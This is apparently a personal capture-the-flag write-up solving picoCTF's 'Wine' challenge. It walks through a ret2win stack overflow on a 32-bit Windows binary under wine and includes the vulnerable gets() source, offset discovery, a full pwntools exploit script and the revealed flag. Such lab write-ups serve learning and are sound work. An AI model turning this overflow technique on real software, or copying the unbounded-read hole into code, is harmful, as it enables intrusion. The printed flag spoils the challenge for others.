---
title: "Wine"
date: "2025-12-11"
tags: ["picoCTF", "buffer overflow", "ret2win", "windows"]
---

They give us a 32 bit windows executable and its source:

```c
󰣇 PWN/picoCTF/wine ❯ ls                                                                                                                                                   ℂ -gcc  05:25 
 vuln.c
 vuln.exe
```

```c
file vuln.exe                                                                                                                                        ℂ  
vuln.exe: PE32 executable for MS Windows 4.00 (console), Intel i386, 15 sections
```

First let's look at the code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void win(){
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("flag.txt not found in current directory.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

void vuln()
{
  printf("Give me a string!\n");
  char buf[128];
  gets(buf);
}

int main(int argc, char **argv)
{

  setvbuf(stdout, NULL, _IONBF, 0);
  vuln();
  return 0;
}

```

We can see it is just a simple ret2win. The gets function does not bound the size, so we can touch the return address and point the program at the `win` function:

```c
gets(buf);
```

So why is it a hard challenge? It looks like it is because it is the first challenge in all of picoCTF where they hand me a windows binary instead of a linux one. So I have to figure out how to open it, debug it and write an exploit for it.

I can open it on my own and run it with wine like this:

```c
wine vuln.exe
```

When looking for the offset to the return address, wine reported it to me after feeding it a cyclic pattern I had generated earlier with pwndbg:

```c
󰣇 PWN/picoCTF/wine ❯ 
python3 solve.py LOCAL                                                                                                                      ℂ -gcc  3.13.7  05:45 
[+] Starting local process '/usr/bin/wine': pid 47652
[*] Switching to interactive mode
00b4:fixme:xinput:pdo_pnp code 0xc, not implemented!
00b4:fixme:xinput:pdo_pnp code 0xc, not implemented!
0134:err:environ:init_peb starting L"Z:\\home\\ub1cu0\\Escritorio\\PWN\\picoCTF\\wine\\vuln.exe" in experimental wow64 mode
\x1b[?25lGive me a string!\x1b[?25h
$ aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpa  aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaa
wine: Unhandled page fault on read access to 6261616B at address 6261616B (thread 0134), starting debugger...
```

```c
pwndbg> cyclic -l 0x6261616B
Finding cyclic pattern of 4 bytes: b'kaab' (hex: 0x6b616162)
Found at offset 140
```

> I watched a guy solve it pulling the offset out of objdump alone, insane, I have to learn that

Now we need the address of win.

```c
objdump -D vuln.exe | grep win   
                                           
00401530 <_win>:
  401551:	75 18                	jne    40156b <_win+0x3b>
```

We now have all the data to write the exploit:

```python
#!/usr/bin/env python3

from pwn import *
import sys

binary = "./vuln.exe"

context.arch = "i386"      # o "amd64" si es de 64 bits
context.os   = "windows"

gdb_script = '''
b main
continue
'''

def conn():
    if args.LOCAL:
        r = process(["wine", binary])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r

    return remote("IP", PORT)

def main():
    io = conn()

    offset = 140
    win = p32(0x00401530)
    payload = b'A' * offset + win

    io.recvline(b'Give me a string!')
    io.sendline(payload)


    io.interactive()

if __name__ == "__main__":
    main()
```

```c
python3 solve.py                                                            

[+] Opening connection to saturn.picoctf.net on port 64736: Done
[!] 'keepends' argument is deprecated. Use 'drop' instead.
[*] Switching to interactive mode
picoCTF{Un_v3rr3_d3_v1n_2ef42747}
```

Thanks for reading!